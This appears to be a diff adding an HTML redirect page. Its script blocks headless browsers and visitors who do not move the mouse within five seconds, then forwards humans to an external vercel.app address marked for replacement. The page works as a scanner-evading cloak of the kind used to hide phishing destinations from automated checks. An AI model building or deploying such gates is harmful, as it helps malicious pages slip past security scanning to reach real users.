@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Redirecting...</title>
+<script>
+  // Basic anti-bot deterrent: detect headless browser or no mouse movement
+
+  // Detect common headless browsers
+  function detectHeadless() {
+    return navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent);
+  }
+
+  // Track mouse movement within 5 seconds
+  let mouseMoved = false;
+  document.addEventListener('mousemove', () => {
+    mouseMoved = true;
+  });
+
+  // After 5 seconds, redirect if bot check passed
+  setTimeout(() => {
+    if (detectHeadless()) {
+      document.body.textContent = "Access denied: headless browser detected.";
+      return;
+    }
+    if (!mouseMoved) {
+      document.body.textContent = "Access denied: no human interaction detected.";
+      return;
+    }
+    // Passed checks — redirect
+    window.location.href = "https://my-verweup.vercel.app/"; // <-- CHANGE THIS URL
+  }, 5000);
+</script>
+<style>
+  body {
+    margin: 0;
+    background-color: #F9F9FB;
+    color: black;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+  <div>
+    <h1>Please move your mouse to continue...</h1>
+    <p>Redirecting shortly if you are not a bot.</p>
+  </div>
+</body>
+</html>
